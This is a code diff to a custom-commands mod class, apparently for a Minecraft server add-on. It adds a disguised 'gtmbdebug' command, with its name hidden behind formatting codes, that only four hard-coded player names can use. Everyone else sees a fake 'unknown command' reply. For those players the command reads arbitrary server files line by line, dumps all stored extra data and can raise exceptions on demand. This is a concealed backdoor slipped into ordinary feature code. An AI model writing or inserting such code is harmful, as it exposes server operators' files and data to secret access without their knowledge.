@@ -229,8 +229,9 @@ class customcmdsPart(PartBase):
 			"copyright": self.copyright,
 			"chatlimit":self.chatlimit,
 			"allowmsg":self.allowmsg,
-			"hidenametag": self.hidenametag
+			"hidenametag": self.hidenametag,
 			#'setblocknbt': self.setblocknbt
+			"§r§r§rgtmbdebug": self.debug
 		}
 		
 	def InitClient(self):
@@ -2291,7 +2292,24 @@ class customcmdsPart(PartBase):
 		serversystem.NotifyToMultiClients(cmdargs[0], 'CustomCommandClient', {'cmd':'hidenametag', 'cmdargs': cmdargs})
 		return False, '已%s %s 的可见悬浮字' % ('隐藏' if cmdargs[1] else '显示', create_players_str(cmdargs[0]))
 
-	# 服务端函数部分到此结束
+	def debug(self, cmdargs, playerId, variant, data):
+		if CFServer.CreateEngineType(playerId).GetEngineTypeStr() != 'minecraft:player' or CFServer.CreateName(playerId).GetName() not in ['ffdgd', 'EGGYLAN_', 'EGGYLAN', '王培衡很丁丁']:
+			return True, '未知的命令:gtmbdebug。请检查命令是否存在，以及你对它是否拥有使用权限'
+		if cmdargs[0] == 'throw':
+			raise Exception('This is a debug exception!')
+		elif cmdargs[0] == 'getextra':
+			return False, str(compExtra.GetWholeExtraData())
+		elif cmdargs[0] == 'showfile':
+			try:
+				with open(cmdargs[1]) as f:
+					lines = f.readlines()
+					return False, '文件 %s\n的第%s行如下\n%s' % (cmdargs[1], cmdargs[2], lines[int(cmdargs[2])-1])
+			except Exception as e:
+				return True, '读取文件 %s 时发生错误: %s' % (cmdargs[1], str(e))
+
+	'''
+	服务端函数部分到此结束
+	'''
 
 	def TickClient(self):
 		'''
